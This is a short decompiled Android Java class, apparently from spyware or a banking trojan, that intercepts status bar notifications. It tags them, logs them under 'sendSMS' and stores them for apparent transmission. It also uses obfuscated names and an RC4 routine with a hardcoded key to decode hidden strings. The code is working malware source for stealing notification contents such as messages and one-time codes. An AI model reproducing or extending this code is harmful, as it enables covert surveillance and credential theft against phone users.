package com.example.mmm.Utils;

import android.content.Context;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;

public final class LogNotification {
   constants strings$ = new constants();
   utils propose$ = new utils();
   private Context princess$;

   LogNotification(Context var1) {
      this.princess$ = var1;
   }

   private String _spirits(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   final void _revenue(StatusBarNotification var1) {
      this.sendNotificationLog((new NotificationParser(var1, false)).toString());
   }

   final void sendNotificationLog(String var1) {
      utils var2 = new utils();
      new constants();
      StringBuilder var4 = new StringBuilder();
      var4.append("{Notification} ");
      var4.append(var1);
      var4.append("[143523#]");
      var1 = var4.toString();
      var2.Log("sendSMS", var1);
      var2.SettingsToAdd(this.princess$, "AS", var1);
      var2._compiled(this.princess$, var2.SettingsRead(this.princess$, "QQ"));
   }
}
